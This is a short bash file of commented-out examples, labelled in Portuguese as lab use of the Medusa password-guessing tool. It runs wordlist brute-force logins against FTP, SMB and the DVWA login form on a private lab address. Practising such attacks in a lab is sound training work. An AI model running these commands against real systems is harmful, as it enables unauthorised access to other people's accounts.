#!/bin/bash
# Exemplos de uso do Medusa em um laboratório controlado

# FTP
# medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp -v 6

# SMB
# medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt -M smbnt -v 6

# Web Form
# medusa -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt -M http -m DIR:/dvwa/login.php -v 6
